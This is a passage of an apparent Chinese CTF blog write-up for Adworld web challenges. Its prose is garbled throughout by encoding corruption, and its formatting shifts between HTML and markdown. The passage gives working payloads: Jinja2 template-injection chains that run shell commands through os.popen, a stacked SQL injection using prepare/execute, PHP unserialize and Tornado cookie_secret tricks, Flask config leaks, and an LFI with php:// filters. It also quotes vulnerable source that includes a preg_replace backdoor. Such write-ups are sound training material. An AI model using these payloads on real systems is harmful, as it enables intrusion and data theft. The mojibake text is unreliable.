<p>æœ€åéƒ½æ˜¯èšå‰‘è¿æ¥ï¼ŒæŸ¥çœ‹flag<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190453332.png" alt="image-20210816190453332"></p>
<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>æ¨¡æ¿æ³¨å…¥é¢˜ï¼Œå­¦ä¸ä¼šå•Šã€‚</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰ - bmjoker - åšå®¢å›­ (cnblogs.com)</a>ï¼Œè¿™é“é¢˜æ˜¯æ¨¡æ¿junjia2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__ ï¼š è¿”å›å¯¹è±¡æ‰€å±çš„ç±»</span><br><span class="line">__mro__ ï¼š è¿”å›ä¸€ä¸ªç±»æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„,ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</span><br><span class="line">__base__ ï¼š è¿”å›è¯¥ç±»æ‰€ç»§æ‰¿çš„åŸºç±»ï¼Œåªèƒ½æ˜¯ä¸Šä¸€ä¸ªåŸºç±»</span><br><span class="line">__subclasses__ ï¼š æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ª ç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨</span><br><span class="line">__init__ ï¼š ç±»çš„åˆå§‹åŒ–æ–¹æ³•</span><br><span class="line">__globals__ ï¼š å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</span><br></pre></td></tr></table></figure>

<p> <code>os.system</code> å’Œ <code>os.popen</code>, è¿™ä¸¤å¥å‰è€…è¿”å›<strong>é€€å‡ºçŠ¶æ€ç </strong> , åè€…<strong>ä»¥fileå½¢å¼</strong>è¿”å›<strong>è¾“å‡ºå†…å®¹</strong>, æˆ‘ä»¬æƒ³è¦çš„æ˜¯å†…å®¹ï¼Œæ‰€æ‰€ä»¥é€‰æ‹© <code>os.popen</code> </p>
<p>åˆ—å‡ºæ­¥éª¤ï¼š</p>
<ol>
<li><code>&#123;&#123;config&#125;&#125;</code>ï¼Œæ£€æµ‹æ˜¯å¦æœ‰æ¨¡æ¿æ³¨å…¥ï¼Œè¿”å›configä¿¡æ¯</li>
<li><code>&#123;&#123;''.__class__&#125;&#125;</code>ï¼Œè¿”å›æ‰€å±ç±»</li>
<li><code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code>ï¼Œè¿”å›æ‰€å±ç±»çš„åŸºç±»</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125;</code>ï¼Œè¿”å›åŸºç±»objectç±»çš„å­ç±»</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>æ‰¾åˆ°æ’åœ¨ç¬¬72ä¸ªçš„site_Printerç±»ï¼Œåˆå§‹åŒ–ç„¶å<code>os.popen</code>æ‰§è¡Œå‘½ä»¤ï¼Œè¯»å–ã€‚</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</code><br><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()&#125;&#125;</code><br>ä½¿ç”¨æ–‡ä»¶å.read()çš„æ–¹å¼è¯»å–æ–‡ä»¶</li>
</ol>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210817112826768.png" alt="image-20210817112826768"></p>
<p>æ€»ç»“ï¼šæœ¬é¢˜æ˜¯å¯¹urlå…ˆä¼ å…¥å†æ¸²æŸ“ï¼Œæ‰€ä»¥åœ¨æ¸²æŸ“çš„æ—¶å€™å¯¹<code>&#123;&#123;&#125;&#125;`å†…å®¹å½“ä½œå˜é‡è§£æï¼Œæ‰€ä»¥å‡ºç°äº†æ¼æ´ã€‚



### Web_php_unserialize

phpååºåˆ—åŒ–æ¼æ´ã€‚

æ ¹æ®æç¤ºæˆ‘ä»¬è¦å¾—åˆ°`fl4g.php`ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡çš„åªæœ‰ä¸¤ä¸ªç‚¹ï¼š

1. ç»•è¿‡`_wakeup()`ï¼Œé€šè¿‡è®©åºåˆ—åŒ–åçš„å±æ€§æ•°è¶…è¿‡æœ¬è¯¥çš„å±æ€§æ•°ï¼Œå¯¼è‡´å¼‚å¸¸ï¼Œä¸æ‰§è¡Œwakeupå‡½æ•°ã€‚
2. ç»•è¿‡`preg_match('/[oc]:\d+:/i', $var)`ï¼Œæ­£åˆ™åŒ¹é…ï¼Œ`[oc]`å…ƒå­—ç¬¦åŒ¹é…ä¸€ä¸ªå­—ç¬¦oæˆ–è€…cï¼Œ`:`æ™®é€šå­—ç¬¦:ï¼Œ`\d`å…ƒå­—ç¬¦åŒ¹é…ä¸€ä¸ªæ•°å­—ï¼Œ`+`å…ƒå­—ç¬¦è¡¨ç¤ºå¯ä»¥åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå­—ç¬¦`\d`ï¼Œ`:`æ™®é€šå­—ç¬¦ã€‚

![image-20210817150314888](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817150314888.png)

å¾—åˆ°flag

![image-20210817153913773](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817153913773.png)

### supersqli

å¼ºç½‘æ¯çš„é¢˜ï¼Œsqlæ³¨å…¥ã€‚

é¦–å…ˆï¼Œ`1' or 1=1 #`æœ‰è¿”å›ç»“æœï¼Œæ˜¯ä¸ªæ³¨å…¥ç‚¹ã€‚

![image-20210817162444026](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817162444026.png)

ç„¶åunion selectè”åˆæŸ¥è¯¢ï¼Œå‘ç°å¤±è´¥äº†ã€‚

![image-20210817162523541](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817162523541.png)

è¿™é“é¢˜è€ƒæŸ¥çš„æ˜¯å †å æ³¨å…¥ï¼ŒæŸ¥è¯¢è¿˜å¯ä»¥ä½¿ç”¨show

1. æŸ¥è¯¢æ‰€æœ‰çš„æ•°æ®åº“ï¼š`1';show database;#`
2. æŸ¥æ‰€æœ‰çš„è¡¨ï¼š`1';show tables;`
3. æŸ¥è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼š``1';show columns from `1919810931114514`;``
4. æŸ¥çœ‹flagå­—æ®µï¼š``1';Set @sql = CONCAT('se','lect flag from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#``ï¼Œè¿‡æ»¤setä½†æ˜¯å¯ä»¥å¤§å°å†™ç»•è¿‡strstrå‡½æ•°

![image-20210817190245570](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817190245570.png)

è¿™é“é¢˜çš„æ–¹æ³•å±å®æœ‰ç‚¹å¤šï¼Œä¸€ä¸‹å­è§è¯†åˆ°äº†sqlæ³¨å…¥çš„å„ç§æ‰‹æ®µå’ŒçŸ¥è¯†ç‚¹ï¼š

1. handlerä»£æ›¿selectï¼Œhandleræ‹¥æœ‰selectçš„éƒ¨åˆ†åŠŸèƒ½
2. é¢„ç¼–è¯‘ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä½¿ç”¨çš„ï¼Œsetã€prepareã€executeã€‚
3. æ›´æ”¹è¡¨ååˆ—åï¼Œå°†ç°åœ¨æ‰€æŸ¥è¯¢çš„è¡¨ä¸æƒ³è¦æŸ¥è¯¢çš„è¡¨ï¼Œç”¨renameå’Œalterè¯­å¥å°†è¡¨åå’Œå­—æ®µåäº’æ¢ï¼Œç„¶åç›´æ¥æŸ¥è¯¢`1' or 1=1`å³å¯å¾—åˆ°flagã€‚
4. showçš„ç”¨æ³•



### easytornado

æ¨¡æ¿æ³¨å…¥é¢˜ï¼Œä½¿ç”¨çš„æ˜¯pythonçš„tornadoæ¨¡æ¿

æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªè·³è½¬åˆ°çš„erroræ–‡ä»¶

![image-20210818092711193](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818092711193.png)

![image-20210818092929405](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818092929405.png)

![image-20210818093021681](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818093021681.png)

![image-20210818093032490](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818093032490.png)

![image-20210818102517809](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818102517809.png)

ç»™äº†å››ä¸ªä¿¡æ¯ï¼š

1. flagåœ¨/fllllllllllllagæ–‡ä»¶
2. rederæ¸²æŸ“ï¼Œrenderæ˜¯ä¸€ä¸ªç±»ä¼¼æ¨¡æ¿çš„ä¸œè¥¿ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°æ¥è®¿é—®ç½‘é¡µ
3. hintæç¤ºï¼Œmd5åŠ å¯†è¿˜æœ‰cookie_secretåŠ ç›ï¼Œä¸urlå¯¹æ¯”ï¼Œå‘ç°è¿™ä¸ªmd5å€¼å°±æ˜¯filehashçš„å€¼ã€‚
4. errorçš„msgå°±æ˜¯æˆ‘ä»¬æ¨¡æ¿æ³¨å…¥çš„åœ°æ–¹

ä¿®æ”¹msgå‚æ•°è¿›è¡Œæ³¨å…¥ã€‚åœ¨tornadoæ¨¡æ¿å¼•æ“ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œ`&#123;&#123;handler.settings&#125;&#125;</code>å¯¹è±¡è·å¾—ç¯å¢ƒå˜é‡</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115153046.png" alt="image-20210818115153046"></p>
<p>ç„¶å<code>md5(cookie_secret+md5(filename))</code>ï¼Œfilename=/fllllllllllllagï¼Œå¾—åˆ°filehash<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115546418.png" alt="image-20210818115546418"></p>
<p>å¾—åˆ°flagï¼š</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115605489.png" alt="image-20210818115605489"></p>
<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><p>è¿›å…¥é¡µé¢æœ‰pythonä»£ç ï¼Œå…ˆè¿›è¡Œä»£ç å®¡è®¡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>flaskæ¡†æ¶ï¼Œæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</p>
<p><code>/shrine/&lt;path:shrine&gt;</code>å¯ä»¥è¢«<code>flask.render_template_string</code>æ¸²æŸ“ï¼ŒåŒæ—¶æˆ‘ä»¬çœ‹åˆ°å¯¹å°æ‹¬å·è¿›è¡Œäº†æ›¿æ¢ï¼Œå°† ( å’Œ ) æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œconfigå’Œselfæ˜¯é»‘åå•ã€‚</p>
<p>æ‰€ä»¥<code>__subclasses__()</code>ã€<code>&#123;&#123;config&#125;&#125;</code>ã€<code>&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</code>ä¸èƒ½ç”¨ï¼Œä½†æ˜¯è¿˜æœ‰åˆ«çš„å‡½æ•°å¯ä»¥ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>





<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><p>è¿›å…¥ç¯å¢ƒï¼Œæ ¹æ®æç¤ºè¿›å…¥äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒï¼Œä¹Ÿå¯ä»¥ç”¨burpæ‰«æç›®å½•å‘ç°ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829144657357.png" alt="image-20210829144657357"></p>
<p>å‘ç°getå‹å‚æ•°page=indexï¼Œå¹¶ä¸”å›æ˜¾åœ¨é¡µé¢ï¼Œåº”è¯¥æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)ã€‚</p>
<p>ä½¿ç”¨hackbarè‡ªå¸¦çš„æµ‹è¯•è¯­å¥</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829153518678.png" alt="image-20210829153518678"></p>
<p>æˆåŠŸæ˜¾ç¤ºè¯´æ˜å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç„¶åå°è¯•hackbarçš„phpä¼ªåè®®</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829165018121.png" alt="image-20210829165018121"></p>
<p>base64è§£ç å¾—åˆ°index.phpæºç ï¼Œè¿›è¡Œå®¡è®¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;renderer&quot; content&#x3D;&quot;webkit&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;layui&#x2F;css&#x2F;layui.css&quot; media&#x3D;&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class&#x3D;&quot;layui-nav&quot;&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;layui-nav-item layui-this&quot;&gt;&lt;a href&#x3D;&quot;?page&#x3D;index&quot;&gt;äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;fieldset class&#x3D;&quot;layui-elem-field layui-field-title&quot; style&#x3D;&quot;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;legend&gt;è®¾å¤‡åˆ—è¡¨&lt;&#x2F;legend&gt;</span><br><span class="line">    &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;table class&#x3D;&quot;layui-hide&quot; id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;table&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;html&quot; id&#x3D;&quot;switchTpl&quot;&gt;</span><br><span class="line">        &lt;!-- è¿™é‡Œçš„ checked çš„çŠ¶æ€åªæ˜¯æ¼”ç¤º --&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin&#x3D;&quot;switch&quot; lay-text&#x3D;&quot;å¼€|å…³&quot; lay-filter&#x3D;&quot;checkDemo&quot; &#123;&#123; d.id&#x3D;&#x3D;1 0003 ? &#39;checked&#39; : &#39;&#39; &#125;&#125;&gt;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;layui&#x2F;layui.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;table&#39;, function() &#123;</span><br><span class="line">        var table &#x3D; layui.table,</span><br><span class="line">            form &#x3D; layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: &#39;#test&#39;,</span><br><span class="line">            url: &#39;&#x2F;somrthing.json&#39;,</span><br><span class="line">            cellMinWidth: 80,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: &#39;numbers&#39; &#125;,</span><br><span class="line">                     &#123; type: &#39;checkbox&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;name&#39;, title: &#39;è®¾å¤‡å&#39;, templet: &#39;#nameTpl&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;area&#39;, title: &#39;åŒºåŸŸ&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;status&#39;, title: &#39;ç»´æŠ¤çŠ¶æ€&#39;, minWidth: 120, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;check&#39;, title: &#39;è®¾å¤‡å¼€å…³&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;element&#39;, function() &#123;</span><br><span class="line">        var element &#x3D; layui.element; &#x2F;&#x2F;å¯¼èˆªçš„hoveræ•ˆæœã€äºŒçº§èœå•ç­‰åŠŸèƒ½ï¼Œéœ€è¦ä¾èµ–elementæ¨¡å—</span><br><span class="line">        &#x2F;&#x2F;ç›‘å¬å¯¼èˆªç‚¹å‡»</span><br><span class="line">        element.on(&#39;nav(demo)&#39;, function(elem) &#123;</span><br><span class="line">            &#x2F;&#x2F;console.log(elem)</span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$page &#x3D; $_GET[page];</span><br><span class="line"></span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class&#x3D;&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;input&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page &#x3D;&#x3D;&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">                    die(&#39;Ok&#39;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 